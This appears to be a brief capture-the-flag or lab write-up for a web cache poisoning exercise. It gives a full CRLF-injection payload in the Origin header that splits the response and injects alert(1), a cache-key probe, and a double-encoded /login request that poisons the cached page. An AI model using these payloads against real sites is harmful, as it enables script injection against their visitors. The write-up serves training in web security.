# Solution

Can see able to pass params to localize.js - play around with setting `cors=1`, can see that Origin is reflected back.

Set `Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$` - this will overwire the response.

Add header `Pragma: x-get-cache-key` to see what the key is.

Modify login such that `GET /login?lang=en?utm_content=x%26cors=1%26x=1$$Origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23`

It ends with `#` so that the `cors=0` becomes part of the anchor. Also it double encodes some `%` since they'll be enocoded twice.

I think only two `$$` are needed because another `$$` will get added on the end of the key.
